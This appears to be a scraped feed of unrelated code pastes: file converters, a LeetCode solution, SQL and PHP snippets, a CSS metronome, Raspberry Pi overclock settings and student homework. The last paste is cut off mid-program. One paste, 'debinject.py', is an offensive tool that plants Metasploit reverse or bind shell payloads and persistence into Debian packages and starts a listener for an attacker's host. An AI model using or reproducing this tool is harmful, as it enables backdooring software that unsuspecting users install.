[Fri Nov 10 13:45:19.383602 2023] [ssl:warn] [pid 4656:tid 508] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Fri Nov 10 13:45:19.430479 2023] [ssl:warn] [pid 4656:tid 508] AH01909: wbs-spi.ut.ac.id:443:0 server certificate does NOT include an ID which matches the server name
[Fri Nov 10 13:45:19.446102 2023] [mpm_winnt:notice] [pid 4656:tid 508] AH00354: Child: Starting 150 worker threads."
EqCxQC2V,convert djvu to pdf,nicuf,Python,Friday 10th of November 2023 01:04:15 AM CDT,"import os
from djvu.decode import DjVuDocument

# Directorul unde se află fișierele .djvu și unde vor fi salvate fișierele .pdf
directory = 'd:\\Electronica\\Dictionarul General Al Literaturii Romane\\'

# Parcurgeți toate fișierele din directorul specificat
for filename in os.listdir(directory):
    if filename.endswith('.djvu'):
        # Calea completă a fișierului .djvu
        djvu_filepath = os.path.join(directory, filename)
        # Calea completă unde va fi salvat fișierul .pdf
        pdf_filepath = os.path.join(directory, filename.replace('.djvu', '.pdf'))

        # Deschideți fișierul .djvu și creați un document
        djvu_document = DjVuDocument(djvu_filepath)

        # Convertiți documentul .djvu în .pdf
        djvu_document.as_pdf(pdf_filepath)

        print(f'Converted {filename} to PDF.')

print('All DJVU files have been converted to PDF.')
"
KTtHkBe9,Convert txt to docx (BARD),nicuf,Python,Friday 10th of November 2023 01:03:43 AM CDT,"import os
from docx import Document

# Funcție pentru citirea textului dintr-un fișier
def read_text_from_file(file_path):
    if not os.path.exists(file_path):
        raise FileNotFoundError(f""Fișierul {file_path} nu există."")
    with open(file_path, encoding='utf8', errors='replace') as f:
        text = f.read()
    return text

# Funcție pentru scrierea textului într-un fișier
def write_to_file(text, file_path):
    with open(file_path, 'wb') as f:
        f.write(text.encode('utf8', 'ignore'))

# Setează calea către directorul cu fișierele TXT
txt_folder_path = r'D:\2022_12_02'

# Setează calea către directorul în care vor fi salvate fișierele DOCX
docx_folder_path = r'D:\2022_12_02\word 3'

# Creează directorul pentru fișierele DOCX dacă nu există deja
if not os.path.exists(docx_folder_path):
    os.makedirs(docx_folder_path)

# Parcurge fiecare fișier TXT din director
for filename in os.listdir(txt_folder_path):
    if filename.endswith("".txt""):
        txt_file_path = os.path.join(txt_folder_path, filename)

        # Citește conținutul fișierului TXT
        content = read_text_from_file(txt_file_path)

        # Setează calea pentru fișierul DOCX de salvat
        docx_file_path = os.path.join(docx_folder_path, f""{os.path.splitext(filename)[0]}.docx"")

        # Creează un document DOCX și adaugă conținutul
        doc = Document()
        doc.add_paragraph(content)

        # Salvează documentul ca fișier DOCX
        doc.save(docx_file_path)

        print(f""Conversie: {txt_file_path} -> {docx_file_path}"")

print(""Conversiile au fost finalizate."")
"
xMPsxPwj,Convert txt to docx (ChatGPT),nicuf,Python,Friday 10th of November 2023 01:02:56 AM CDT,"import os
from docx import Document

# Funcție pentru citirea textului dintr-un fișier
def read_text_from_file(file_path):
    with open(file_path, encoding='utf8', errors='ignore') as f:
        text = f.read()
        return text

# Funcție pentru scrierea textului într-un fișier
def write_to_file(text, file_path):
    with open(file_path, 'wb') as f:
        f.write(text.encode('utf8', 'ignore'))

# Setează calea către directorul cu fișierele TXT
txt_folder_path = r'D:\2022_12_02'

# Setează calea către directorul în care vor fi salvate fișierele DOCX
docx_folder_path = r'D:\2022_12_02\word 2'

# Creează directorul pentru fișierele DOCX dacă nu există deja
os.makedirs(docx_folder_path, exist_ok=True)

# Parcurge fiecare fișier TXT din director
for filename in os.listdir(txt_folder_path):
    if filename.endswith("".txt""):
        txt_file_path = os.path.join(txt_folder_path, filename)

        # Citeste continutul fisierului TXT
        content = read_text_from_file(txt_file_path)

        # Setează calea pentru fișierul DOCX de salvat
        docx_file_path = os.path.join(docx_folder_path, f""{os.path.splitext(filename)[0]}.docx"")

        # Crează un document DOCX și adaugă continutul
        doc = Document()
        doc.add_paragraph(content)

        # Salvează documentul ca fișier DOCX
        doc.save(docx_file_path)

        print(f""Conversie: {txt_file_path} -> {docx_file_path}"")

print(""Conversiile au fost finalizate."")
"
ghcz2J2K,57. Insert Interval,micahbales,JavaScript,Friday 10th of November 2023 12:54:31 AM CDT,"/**
* Problem statement: https://leetcode.com/problems/insert-interval/
*/

/* My trash initial solution */

/**
 * @param {number[][]} intervals
 * @param {number[]} newInterval
 * @return {number[][]}
 */
var insert = function(intervals, newInterval) {
    if (intervals.length < 1) return [newInterval]

    const [newStart, newEnd] = newInterval
    const res = []

    let alreadyMerged = false
    let savedStart = -1

    for (let [currentStart, currentEnd] of intervals) {
        if (savedStart >= 0 && !alreadyMerged) {
            if (newEnd < currentStart) {
                res.push([savedStart, newEnd])
                res.push([currentStart, currentEnd])
                alreadyMerged = true
            } else if (newEnd <= currentEnd) {
                res.push([savedStart, currentEnd])
                alreadyMerged = true
            }
            continue
        }

        if (alreadyMerged || newStart > currentEnd) {
            res.push([currentStart, currentEnd])
            continue
        }

        if (newEnd < currentStart) {
            res.push(newInterval)
            res.push([currentStart, currentEnd])
            alreadyMerged = true
            continue
        }

        if (newStart <= currentEnd) {
            const mergedStart = newStart < currentStart ? newStart : currentStart
            if (newEnd < currentEnd) {
                res.push([mergedStart, currentEnd])
                alreadyMerged = true
            } else {
                savedStart = mergedStart
            }
        }
    }

    if (!alreadyMerged) {
        savedStart = savedStart >= 0 ? savedStart : newStart
        res.push([savedStart, newEnd])
    }

    return res
};

/* A much more elegant solution */

/**
 * @param {number[][]} intervals
 * @param {number[]} newInterval
 * @return {number[][]}
 */
var insert = function(intervals, newInterval) {
    const res = []
    let [mStart, mEnd] = newInterval
    let merged = false

    for (let [start, end] of intervals) {
        if (end < mStart) {
            res.push([start, end])
        } else if (start > mEnd) {
            if (!merged) res.push([mStart, mEnd])
            merged = true
            res.push([start, end])
        } else {
            mStart = Math.min(start, mStart)
            mEnd = Math.max(end, mEnd)
        }
    }

    if (!merged) res.push([mStart, mEnd])

    return res
};"
q3ZL9q5a,Untitled,sarjsarj,PHP,Thursday 9th of November 2023 11:55:22 PM CDT,"if (isset($_POST['save_grades'])) {
    // Check if the button with name 'save_grades' was clicked

    foreach ($_POST['gradeInput'] as $studentKey => $grade) {
        // Split the $studentKey to get section and student numbers
        list($section, $student) = explode('_', $studentKey);

        // Construct studentName based on the section and student number
        $studentName = ""SEC"" . $section . ""_STUD"" . $student;

        // Use prepared statements to insert data into the ""midtermexam2"" table
        $insertQuery = ""INSERT INTO midtermexam2 (studentName, subject, section, grade) VALUES (?, ?, ?, ?)"";
        $stmt = $conn->prepare($insertQuery);
        $stmt->bind_param(""sssd"", $studentName, $subject, $section, $grade);

        // Execute the insert query
        if ($stmt->execute()) {
            // Data inserted successfully
            echo ""Grade for Section $section, Student $student inserted successfully.<br>"";
        } else {
            // Handle error if the insertion fails
            echo ""Error inserting grade for Section $section, Student $student: "" . $conn->error . ""<br>"";
        }
    }
}"
Gym6ve8W,Raspberry PI 4 Over Clock Settings,rehannali,autoconf,Thursday 9th of November 2023 11:53:15 PM CDT,"[all]
force_turbo=1
arm_freq=2147
arm_freq_min=100
gpu_freq=750
gpu_freq_min=100
over_voltage=8
over_voltage_min=-16
hdmi_group=2
hdmi_mode=82
hdmi_force_hotplug=1"
ZtSLbSeV,rolling square metronome,Mangus875,HTML,Thursday 9th of November 2023 11:38:45 PM CDT,"<!DOCTYPE html>
<html>
	<head>
		<title>Animated Metronome</title>
		<style>
			:root {
			background-color: #2d2d2d;
			}
			.rolling_square {
			--bpm: 120;
			--duration: calc(240s / var(--bpm));
			position: absolute;
			left: 50%;
			top: 50%;
			width: 50vh;
			height: 50vh;
			background-color: #fff;
			transform: translate(-50%, -50%);
			}
			.rolling_square div {
			position: absolute;
			width: 50%;
			height: 50%;
			background-color: #ff5533;
			animation: roll var(--duration) ease-in infinite;
			animation-play-state:
			}
			@keyframes roll {
			0% {
			transform-origin: top right;
			transform: translate(0%, 0%);
			}
			25% {
			transform-origin: top right;
			transform: rotate(-90deg);
			}
			25.000001% {
			transform-origin: bottom right;
			transform: translate(100%, 0) rotate(0deg);
			}
			50% {
			transform-origin: bottom right;
			transform: translate(100%, 0%) rotate(-90deg);
			}
			50.000001% {
			transform-origin: bottom left;
			transform: translate(100%, 100%) rotate(0deg);
			}
			75% {
			transform-origin: bottom left;
			transform: translate(100%, 100%) rotate(-90deg);
			}
			75.000001% {
			transform-origin: top left;
			transform: translate(0%, 100%) rotate(0deg);
			}
			100% {
			transform-origin: top left;
			transform: translate(0%, 100%) rotate(-90deg);
			}
			}
			.slidecontainer {
			position: absolute;
			left: 50%;
			top: 24%;
			transform: translate(-50%, -50%);
			width: 45vh;
			display: flex;
			flex-direction: row;
			}
			.slidecontainer::before {
			transform: translateY(-60%);
			font-family: consolas;
			font-size: 20px;
			color: #fff;
			content: attr(data-bpm) "" BPM"";
			}
			.slider {
			-webkit-appearance: none;
			width: 100%;
			height: 10px;
			border-radius: 5px;
			background: #ddd;
			outline: none;
			}
			.slider::-webkit-slider-thumb {
			-webkit-appearance: none;
			appearance: none;
			width: 15px;
			height: 15px;
			border-radius: 50%;
			background: #ff5533;
			cursor: pointer;
			}
		</style>
		<script>
			var bpmSlider,met;
			
			window.onload = () => {
				bpmSlider = document.getElementById(""bpm-slider"");
				met = document.querySelector("".rolling_square div"");
				
				setInterval(() => {
					let bpm = bpmSlider.value;
					met.style.setProperty('--duration', `calc(240s / ${bpm})`);
					document.querySelector("".slidecontainer"").setAttribute(""data-bpm"", bpm);
				});
				
				document.querySelector("".rolling_square"").onclick = () => {
					let playing = getComputedStyle(met).getPropertyValue(""animation-play-state"") == ""running"";
					if (playing) {
						met.style.setProperty(""animation-play-state"", ""paused"");
						met.style.setProperty(""animation"", ""none"");
						setTimeout(() => {
							met.style.setProperty(""animation"", ""roll var(--duration) ease-in infinite"");
							met.style.setProperty(""animation-play-state"", ""paused"");
						});
						return;
					}
					met.style.setProperty(""animation-play-state"", ""running"");
				}
			}
		</script>
	</head>
	<body>
		<div class='slidecontainer' data-bpm='120'>
			<input type='range' min='10' max='360' value='120' class='slider' id='bpm-slider'>
		</div>
		<div id='metronome' class='rolling_square'>
			<div id='ticker'></div>
		</div>
	</body>
</html>"
auZkTX0B,debinject.py,FlyFar,Python,Thursday 9th of November 2023 10:28:21 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#-------------------------------
#
#      BY: UNDEADSEC from BRAZIL :)
#      Visit: https://www.youtube.com/c/UndeadSec
#      Github: https://github.com/UndeadSec/EvilURL
#      Telegram: https://t.me/UndeadSec
#
#-------------------------------
BLUE, RED, WHITE, YELLOW, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;32m', '\033[0m'
#-------------------------------
from subprocess import call
#-------------------------------
def message():
    call('clear', shell=True)
    print """"""

 --------------------{1}
┌┬┐┌─┐┌┐ ┬┌┐┌ ┬┌─┐┌─┐┌┬┐   
 ││├┤ ├┴┐││││ │├┤ │   │ BY: {1}Undead{2}Sec{1} from BRazil {0}
─┴┘└─┘└─┘┴┘└┘└┘└─┘└─┘ ┴ 
{0} --------------------{1}

"""""".format(GREEN, END, RED, YELLOW, GREEN)
#-------------------------------
def main():
    call('rm -Rf output', shell=True)
    call(""rm -Rf /tmp/evil"", shell=True)
    print '~ / Inject malicious codes into *.deb\'s\n '
    print ""{0}[-] Insert *.deb file path: {1}"".format(YELLOW, END)
    file_path = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    print ""\n{0}[-] Insert LHOST: {1}"".format(YELLOW, END)
    LHOST = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    print ""\n{0}[-] Insert LPORT: {1}"".format(YELLOW, END)
    LPORT = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    call('mkdir /tmp/evil', shell=True)
    call('cp ' + file_path + ' /tmp/evil/original.deb', shell=True)
    call('dpkg -x /tmp/evil/original.deb /tmp/evil/work', shell=True)
    call('mkdir /tmp/evil/work/DEBIAN', shell=True)
#-------------------------------
def setArch():
    print '\nInsert the target arch x86 or x64: '
    arch = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    if arch == 'x64':
        call('cp Utils/x64/control /tmp/evil/work/DEBIAN')
        call('cp Utils/x64/postinst /tmp/evil/work/DEBIAN')
    elif arch == 'x86':
        call('cp Utils/x86/control /tmp/evil/work/DEBIAN')
        call('cp Utils/x86/postinst /tmp/evil/work/DEBIAN')
    else:
        print ""\nChoose [x64] or [x86]""
#-------------------------------
def setPayload():
    print ""\n - CHOOSE THE PAYLOAD -  \n[1] metasploit/linux/<arch>/shell/reverse_tcp\n[2] metasploit/linux/<arch>/meterpreter/reverse_tcp\n[3] metasploit/linux/<arch>/meterpreter/bind_tcp\n[4] metasploit/linux/<arch>/shell/bind_tcp""
    option = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    if option == '1':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '2':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '3':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '4':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    else:
        print ""\nInvalid""
        call('exit', shell=True)
#-------------------------------
def setPersistence():
    persistence = raw_input('\nDo you want to enable persistence?(y/n) : ')
    if persistence.upper() == 'Y':
        call('cp Utils/Persistence/kernellog /tmp/evil/work/usr/games/', shell=True)
#-------------------------------
def makeEvil():
    call('chmod 755 /tmp/evil/work/DEBIAN/postinst', shell=True)
    call('cd /tmp/evil/work/DEBIAN && dpkg-deb --build /tmp/evil/work', shell=True)
    call('rm -Rf output/ && mkdir output', shell=True)
    call('mv /tmp/evil/work.deb output/backdoored.deb && chmod 755 output/backdoored.deb', shell=True)
    print ""\n The .deb backdoored saved to: /output/backdoored.deb\n""
    listen = raw_input(""Do you want to start listener? (y/n): "")
    if option != '3' and option != '4':
        if listen.upper() == ""Y"":
            if option == '1':
	        call('service postgresql start', shell=True)
                call('msfconsole -q -x ""use exploit/multi/handler;set PAYLOAD linux/' + arch + '/shell/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y""', shell=True)
	    elif option == '2':
	        call('service postgresql start')
                call('msfconsole -q -x ""use exploit/multi/handler;set PAYLOAD linux/' + arch + '/meterpreter/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y""', shell=True)
        else:
            print ""Bye :D""
    else:
        print ""\nStart Metasploit listener and Happy Hacking""
#-------------------------------
if __name__ == '__main__':
    message()
    main()
    setArch()
    setPayload()
    setPersistence()
    makeEvil()"
EiD37dKk,validator class,cirossmonteiro,Python,Thursday 9th of November 2023 10:20:05 PM CDT,"class Validator:
    def __call__(self, value):
        return self.validate(value)

class MinValidator(Validator):
    def __init__(self, minimum):
        self.minimum = minimum
        
    def validate(self, value):
        return value >= self.minimum

class MaxValidator(Validator):
    def __init__(self, maximum):
        self.maximum = maximum
        
    def validate(self, value):
        return value <= self.maximum

# big version
##class BetweenValidator(MinValidator, MaxValidator):
##    def __init__(self, minimum, maximum):
##        MinValidator.__init__(self, minimum)
##        MaxValidator.__init__(self, maximum)
##        
##    def validate(self, value):
##        return MinValidator.validate(self, value) and MaxValidator.validate(self, value)

class MergeValidators(Validator):
    validator_classes = []
    
    def __init__(self, *args):
        for index, vclass in enumerate(self.validator_classes):
            if type(args[index]) == list:
                vclass.__init__(self, *args[index])
            else:
                vclass.__init__(self, args[index])

    def validate(self, value):
        for index, vclass in enumerate(self.validator_classes):
            if not vclass.validate(self, value):
                return False

        return True
        
# small version
class BetweenValidator(MergeValidators):
    validator_classes = [
        MinValidator,
        MaxValidator
    ]

assert BetweenValidator(18, 25)(18) 
# same as ""MinValidator(18)(18) and MaxValidator(25)(18)"""
dYmDM8kx,glamiau,Arconteus,SQL,Thursday 9th of November 2023 09:34:21 PM CDT,"/*
Crear un trigger que dada una tabla llamada:
Inventario con atributos 
id_car, 
modelo_car, 
marca_car, 
anio_car, 
precio_car

al momento de asignar nuevas unidades al inventario decida a cuál de las tres agencias (Norte, Oriente y Sur) se asigna la unidad. 

La tabla afectada por el trigger se llama 
Mov_Inventario y consta de los siguientes atributos: 
id_reg, 
id_car (dato de la tabla inventario), 
marca, 
modelo, 
fecha_reg, 
usuario_reg y 
movimiento (por el momento solo registre stock). 

La acción disparadora será por tanto un insert.
*/
/*
========================================================
CREAR BASE DE DATOS
========================================================
*/
CREATE DATABASE Practica ON(
    name = Practica_dat,
    filename = 'C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\Practica.mdf',
    SIZE = 10MB,
    maxsize = 30MB,
    filegrowth = 5MB
)
log ON(
    name = Practica_log,
    filename = 'C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\Practica.ldf',
    SIZE = 5MB,
    maxsize = 30MB,
    filegrowth = 5MB
);
USE Practica
GO
/*
========================================================
CREAR TABLAS
========================================================
*/
CREATE TABLE inventario(
	id_car SMALLINT PRIMARY KEY, 
	modelo_car VARCHAR(50) NOT NULL, 
	marca_car VARCHAR(30) NOT NULL, 
	anio_car SMALLINT NOT NULL, 
	precio_car DECIMAL(10,2)
);
CREATE TABLE Mov_Inventario (
    id_reg INT PRIMARY KEY,
    id_car SMALLINT not null,
    marca VARCHAR(30) not null,
    modelo VARCHAR(50) not null,
    fecha_reg DATE not null,
    usuario_reg VARCHAR(255) not null,
    movimiento VARCHAR(255) not null,
	CONSTRAINT ""FK_ID_CAR"" FOREIGN KEY(id_car)
	REFERENCES inventario(id_car)
);
/*
========================================================
TRIGGER
========================================================
*/
CREATE TRIGGER tg_registro
ON inventario AFTER INSERT AS
BEGIN SET NOCOUNT ON;
	-- AGENCIA
	DECLARE @agencia varchar(7);
	UPDATE Mov_Inventario
    SET @agencia = 
        CASE 
            WHEN i.anio_car >= 2023 THEN 'Norte'
            WHEN i.anio_car >= 2015 AND i.anio_car < 2022 THEN 'Sur'
            ELSE 'Oriente'
        END
    FROM Mov_Inventario m, Inventario i, inserted ins
	WHERE m.id_car = i.id_car 
	AND	i.id_car = ins.id_car;
    SELECT CONCAT('La agencia: ', @agencia,' se encargara de este modelo.') AS Mensaje;
	-- INSERT INTO
	INSERT INTO Mov_Inventario (id_car, marca, modelo, fecha_reg, usuario_reg, movimiento)
    SELECT i.id_car, i.marca_car, i.modelo_car, GETDATE(), SYSTEM_USER, 'stock'
    FROM Inventario i, inserted ins 
	WHERE i.id_car = ins.id_car; 
END;
"
mfPFket7,ProveedoresVisita,orezalucard,C#,Thursday 9th of November 2023 09:08:57 PM CDT,"SELECT ROW_NUMBER() OVER(PARTITION BY P.Pro_Codigo ORDER BY P.Pro_Codigo) AS Number, P.Pro_Codigo, CONCAT(P.Pro_Nombre,' ', P.Pro_ApellidoPaterno,' ',P.Pro_ApellidoMaterno) AS NombreProveedor, PD.Pro_DiaVisita,
NE.NE_Fecha,
CONCAT(NE.FolTda_Codigo,'-',NE.FolEst_Codigo,'-',NE.FolDoc_Codigo,'-',NE.FolConsecutivo) AS Folio, NE.FolTda_Codigo,NE.FolEst_Codigo,NE.FolDoc_Codigo,NE.FolConsecutivo,
ROW_NUMBER() OVER (PARTITION BY NE.Pro_Codigo, CAST(NE.NE_Fecha AS DATE) ORDER BY NE.Pro_Codigo, CAST(NE.NE_Fecha AS DATE)) AS FilaDocumento
FROM Proveedores P
INNER JOIN ProveedoresDeta PD ON P.Pro_Codigo = PD.Pro_Codigo
LEFT JOIN NotasEntrada NE ON NE.Pro_Codigo = P.Pro_Codigo AND NE.TMA_Codigo = 1
WHERE NE.NE_Fecha BETWEEN @DesdeFecha AND @HastaFecha  AND P.Pro_Codigo BETWEEN @ProveedorInicio AND @ProveedorFinal"
py3tSh17,remove popup ads on tradingview as soon as they pop onto screen.,Build,JavaScript,Thursday 9th of November 2023 08:08:48 PM CDT,"// Callback function to handle mutations
const handleMutations = (mutationsList) => {
	for (const mutation of mutationsList) {
		if (mutation.type === ""childList"") {
			// Check if the ads element is added or removed
			const overlapManager = document.querySelector(
				""#overlap-manager-root > div:nth-child(2)""
			);
			const goPro = document.querySelector(
				""#overlap-manager-root > div:nth-child(2) > div""
			);
			const span = document.querySelector(
				""#overlap-manager-root > div:nth-child(4) > div""
			);

			if (overlapManager) {
				if (goPro) {
					console.log(""Ads found!"");
					goPro.remove();
					console.log(""Ads removed :)"");
				}
				if (span) {
					console.log(""Ads found!"");
					span.remove();
					console.log(""Ads removed :)"");
				}
			}
		}
	}
};

// Options for the MutationObserver (configuring what to observe)
const observerConfig = { childList: true, subtree: true };

// Create a MutationObserver with the callback and options
const observer = new MutationObserver(handleMutations);

// Start observing the target node (body) with the specified options
observer.observe(document.body, observerConfig);

// To stop observing (optional)
// observer.disconnect();
"
Q9zdTsZP,ExamenP1 Distributed Computing,MateoCabrera,Python,Thursday 9th of November 2023 07:49:18 PM CDT,"import csv
import ray
import time

# Función que calcula la suma de cubos de una lista de números
def suma_cubos(numbers):
    sum = 0
    for num in numbers:
        sum += num**3
    return sum

# Función para ejecutar de manera local
def run_local(file_path):
    #vamos a usar dos arreglos uno para ir almacenando la informacion y otro para recorrer una parte dle archivo
    numbers = []
    datos = []
    # abrivos el archivo que se encuentra en file_path
    with open(file_path, newline='') as archivo_csv:
        #creamos un lector de los elementos segun la orientacion en la documentacion de la libreria CSV
        lector_csv = csv.DictReader(archivo_csv)
        #iteramos cada fila ya que en el archivo por cada datos que vamos a importar
        for fila in lector_csv:
            #hacemos apencides en el arreglo para añadir los numeros
            datos.append(fila)
            numero = int(fila['numero'])
            numbers.append(numero)
            #los incertamos al arreglo de numbers
    #calculamos la sumas de los cubos de los numeros y tomamos el tiempo de ejecucion
    start_time = time.time() #esto es una funcion de python para tomar el tiempo
    resultado = suma_cubos(numbers)
    duration = time.time() - start_time
    print('Local execution time: {}'.format(duration))
    print('Resultado de la suma local es: ', resultado)
    #imprimimos los resultados de la medicion del timepo
    return datos, resultado

# Función para ejecutar de manera remota con Ray
@ray.remote #usamos este decorador para declarar nuestro tipo de ejecucion
def suma_cubos_distributed(numbers):
    return suma_cubos(numbers) #mandamos que funcion va a ejecutar remotamente

# Función que utiliza Ray para calcular la suma de cubos distribuida desde un archivo CSV
@ray.remote
def run_remota(file_path):
    # vamos a usar dos arreglos uno para ir almacenando la informacion y otro para recorrer una parte dle archivo
    numbers = []
    datos = []
    with open(file_path, newline='') as archivo_csv:
        # creamos un lector de los elementos segun la orientacion en la documentacion de la libreria CSV
        lector_csv = csv.DictReader(archivo_csv)
        # iteramos cada fila ya que en el archivo por cada datos que vamos a importar
        for fila in lector_csv:
            # hacemos apencides en el arreglo para añadir los numeros
            datos.append(fila)
            numero = int(fila['numero'])
            numbers.append(numero)
    start_time = time.time()  # esto es una funcion de python para tomar el tiempo
    resultado = suma_cubos(numbers)
    duration = time.time() - start_time
    print('Local execution time: {}'.format(duration))
    print('Resultado de la suma remota es: ', resultado)
    # imprimimos los resultados de la medicion del timepo
    return datos, resultado


# Ejecutar pruebas desde un archivo CSV (ajusta la ruta según tu caso)
file_path1 = 'datos1.csv'
file_path2 = 'datos2.csv'
file_path3 = 'datos3.csv'


#descomentar estas lineas para la ejecucion
# ---------------Llamar a la función run_local---------------
# para el archivo datos 1
#datos_local, resultado_local = run_local(file_path1)
#print('Datos 1 del archivo CSV (local):', datos_local) #esta es una funcion que nos permite ver como se lelleron los datos des archivo

# para el archivo datos 2
#datos_local, resultado_local = run_local(file_path2)
#print('Datos 2 del archivo CSV (local):', datos_local)

# para el archivo datos 3
#datos_local, resultado_local = run_local(file_path3)
#print('Datos 3 del archivo CSV (local):', datos_local)

# ---------------Llamar a la función run_remota---------------
# para el archivo datos 1
#resultado_remoto = run_remota.remote(file_path1)"
Hh3CxwR4,Untitled,okayboaa,C,Thursday 9th of November 2023 07:25:30 PM CDT,"// send.c
#include ""send.h""

void send(int id)
{

    if (id == 1)
    {
        char buffer[4];
        // sender 1
        for (int i = 0; i < 8; i++)
        {
            int fd = open(MY_FIFO, O_WRONLY);
            sprintf(buffer, ""%d%d%d"", i, i + 1, i + 2);
            write(fd, buffer, sizeof(buffer) - 1);
            sleep(1);
            close(fd);
        }
    }

    if (id == 2)
    {
        char buffer[4]; // Adjusted buffer size
        // sender 2
        for (int i = 0; i < 25; i++)
        {
            int fd = open(MY_FIFO, O_WRONLY);
            sprintf(buffer, ""%c%c%c"", i + 'a', i + 1 + 'a', i + 2 + 'a');
            write(fd, buffer, sizeof(buffer) - 1);
            sleep(1);
            close(fd);
        }
    }
}

// send.h
#ifndef SEND_H
#define SEND_H

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#define MY_FIFO ""fifo""

void send(int id);

#endif
// reader.c
#include ""send.h""

int main()
{
    mkfifo(MY_FIFO, 0666);
    int fd = open(MY_FIFO, O_RDONLY);

    for (;;)
    {
        char buffer[4];
        int n = read(fd, buffer, 4);
        if (n == 0)
        {
            continue;
        }
        puts(buffer);
    }

    close(fd);
    unlink(MY_FIFO);
}
// sender 1
#include ""send.h""

int main()
{
    send(1);
}

// sender 2
#include ""send.h""

int main()
{
    send(2);
}


// compile 
gcc -o reader reader.c
gcc -o sender1 sender1.c send.c
gcc -o sender2 sender2.c send.c"
CT0Rkdmq,9. heti házi,Levi0227,C#,Thursday 9th of November 2023 06:28:37 PM CDT,"namespace PMPHF008_P99J7Y
{
    internal class PMPHF008_P99J7Y
    {
        static void Main(string[] args)
        {
            string S = Console.ReadLine();
            string[] parts = S.Split("" "");
            string utasitas = parts[0];
            List<string> letter = new List<string>();

            int[] feszultsegek1 = new int[5];
            int[] feszultsegek2 = new int[5];
            string[,] matrixVoltage = new string[2, 5];

            //Használadnó jelsorozat nevének eltárolása listában
            if (parts.Length - 1 == 2)
            {
                letter.Add(parts[1]);
                letter.Add(parts[2]);
            }
            else if (parts.Length - 1 == 1)
            {
                letter.Add(parts[1]);
            }

            string lines = """";
            bool felvantoltve = false;
            bool igaz1 = false;
            bool igaz2 = false;

            //Bemenet felosztása kettesével és tömbökbe töltése
            #region Számok párba állítása
            while (felvantoltve != true)
            {
                lines = Console.ReadLine();
                for (int i = 0; i < letter.Count; i++)
                {
                    if (letter.Count == 2)
                    {
                        if (lines.Split("" "")[0] == letter[0])
                        {
                            int index = 0;
                            for (int j = 0; j < lines.Split("" "")[1].Length; j += 2)
                            {
                                string eleje = lines.Split("" "")[1].Substring(j, 2);
                                int kettesszamok = int.Parse(eleje);
                                feszultsegek1[index] = kettesszamok;
                                index++;
                                igaz1 = true;
                            }
                        }
                        if (lines.Split("" "")[0] == letter[1])
                        {
                            int index = 0;
                            for (int j = 0; j < lines.Split("" "")[1].Length; j += 2)
                            {
                                string eleje = lines.Split("" "")[1].Substring(j, 2);
                                int kettesszamok = int.Parse(eleje);
                                feszultsegek2[index] = kettesszamok;
                                index++;
                                igaz2 = true;
                            }

                        }
                        if (igaz1 == true && igaz2 == true)
                            felvantoltve = true;
                    }
                    else if (letter.Count == 1)
                    {
                        if (lines.Split("" "")[0] == letter[i])
                        {
                            int index = 0;
                            for (int j = 0; j < lines.Split("" "")[1].Length; j += 2)
                            {
                                string eleje = lines.Split("" "")[1].Substring(j, 2);
                                int kettesszamok = int.Parse(eleje);
                                feszultsegek1[index] = kettesszamok;
                                index++;
                            }
                            felvantoltve = true;
                        }
                    }
                }
            }
            #endregion Számok párba állítása

            //Feszültségek átkonvertálása és tárolása listákban
            #region Átkonvertálás
            if (letter.Count == 2)
            {
                for (int k = 0; k < feszultsegek1.Length; k++)
                {
                    if (feszultsegek1[k] >= 0 && feszultsegek1[k] <= 8)
                    {
                        matrixVoltage[0, k] = ""0"";
                    }
                    else if (feszultsegek1[k] >= 27 && feszultsegek1[k] <= 50)
                    {
                        matrixVoltage[0, k] = ""1"";
                    }
                    else
                    {
                        matrixVoltage[0, k] = ""E"";
                    }
                }
                for (int k = 0; k < feszultsegek2.Length; k++)
                {
                    if (feszultsegek2[k] >= 0 && feszultsegek2[k] <= 8)
                    {
                        matrixVoltage[1, k] = ""0"";
                    }
                    else if (feszultsegek2[k] >= 27 && feszultsegek2[k] <= 50)
                    {
                        matrixVoltage[1, k] = ""1"";
                    }
                    else
                    {
                        matrixVoltage[1, k] = ""E"";
                    }
                }
            }
            else if (letter.Count == 1)
            {
                for (int k = 0; k < feszultsegek1.Length; k++)
                {
                    if (feszultsegek1[k] >= 0 && feszultsegek1[k] <= 8)
                    {
                        matrixVoltage[0, k] = ""0"";
                    }
                    else if (feszultsegek1[k] >= 27 && feszultsegek1[k] <= 50)
                    {
                        matrixVoltage[0, k] = ""1"";
                    }
                    else
                    {
                        matrixVoltage[0, k] = ""E"";
                    }
                }
            }
            #endregion Átkonvertálás

            Console.Clear();

            //Logikai kapuk alapján való kiiratás
            #region Logikai Kapuk
            if (utasitas == ""AND"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
